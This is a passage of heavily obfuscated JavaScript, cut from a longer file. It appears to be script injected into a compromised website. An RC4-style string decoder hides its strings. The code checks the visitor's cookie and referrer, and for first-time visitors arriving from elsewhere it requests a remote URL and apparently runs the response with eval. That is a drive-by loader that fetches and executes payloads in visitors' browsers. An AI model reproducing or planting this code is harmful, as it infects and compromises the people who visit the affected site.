L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};